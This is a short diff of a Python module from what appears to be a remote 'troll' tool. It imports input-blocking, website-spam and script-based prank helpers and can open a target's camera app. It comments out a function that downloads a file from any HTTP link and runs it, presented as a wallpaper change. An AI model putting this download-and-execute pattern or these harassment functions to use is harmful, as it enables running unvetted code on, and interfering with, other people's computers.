@@ -1,15 +1,11 @@
-from ..scripting_interface import *
 import ctypes
+from ..scripting_interface import *
 from ..input_output import block_input
 from ...scripts.vb_scripts.troll import showMessage
 from ...scripts.batch_scripts import troll as bt
 from ...scripts.vb_scripts import troll as vt
 from ...scripts.powershell_scripts import troll as pt
-from ..file_system import Download
-from .type_message import TypeMessage, type_message_obj
-from .cd import Cd, cd_obj
-from .website_spam import WebsiteSpam, website_spam_obj
-from .window_troll import window_troll_obj
+
 
 
 def show_message_box(title, message, VBS = True):
@@ -61,14 +57,14 @@ def run_troll_script(scriptName:str, blocktime = 0, *formatText):
 def open_camera_app():
     p = subprocess.Popen([CMD_PATH, "/c", "start", "Microsoft.windows.camera:"] , subprocess.CREATE_NEW_CONSOLE)
 
-def change_wallpaper_http(link_to_themepack:str):
-    if ".themepack" not in link_to_themepack:
-        return 0
-    try:
-        _ , name = Download.download_file_http(link_to_themepack, saveTo = TEMP)
-        subprocess.Popen(os.path.join(TEMP, name), creationflags = subprocess.CREATE_NEW_CONSOLE)
-        return 1
-    except:
-        return 0
+#def change_wallpaper_http(link_to_themepack:str):
+ #   if ".themepack" not in link_to_themepack:
+  #      return 0
+   # try:
+    #    _ , name = Download.download_file_http(link_to_themepack, saveTo = TEMP)
+     #   subprocess.Popen(os.path.join(TEMP, name), creationflags = subprocess.CREATE_NEW_CONSOLE)
+      #  return 1
+    #except:
+     #   return 0
 
 
